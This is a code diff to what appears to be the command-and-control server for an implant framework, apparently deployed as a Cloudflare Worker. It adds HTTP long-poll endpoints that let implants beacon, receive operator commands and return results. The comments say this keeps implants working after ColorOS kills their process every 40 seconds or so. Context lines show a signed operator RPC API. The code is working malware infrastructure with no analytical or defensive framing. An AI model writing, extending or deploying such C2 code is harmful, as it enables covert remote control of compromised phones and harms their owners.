@@ -27,6 +27,32 @@ app.get('/t/:transport/:implantId', async (c) => {
   return stub.fetch(c.req.raw);
 });
 
+// 1b. Beacon transport (HTTP long-poll). Preferred over /t/wss: no WebSocket,
+// so nothing can go wrong in the Worker <-> DO socket handoff, and a process
+// that ColorOS reaps every ~40s simply resumes beaconing on its next tick.
+// Command delivery is still immediate: the DO resolves the parked poll.
+app.post('/t/poll/:implantId', async (c) => {
+  const implantId = c.req.param('implantId');
+  const stub = c.env.IMPLANT_STATE.get(c.env.IMPLANT_STATE.idFromName(implantId));
+  const body = await c.req.text();
+  return stub.fetch(new Request(`http://do/poll/${implantId}`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body,
+  }));
+});
+
+app.post('/t/recv/:implantId', async (c) => {
+  const implantId = c.req.param('implantId');
+  const stub = c.env.IMPLANT_STATE.get(c.env.IMPLANT_STATE.idFromName(implantId));
+  const body = await c.req.text();
+  return stub.fetch(new Request(`http://do/recv/${implantId}`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body,
+  }));
+});
+
 // 2. Operator RPC API (signed with Ed25519)
 app.post('/api/rpc', async (c) => {
   const sigHex = c.req.header('X-Signature');
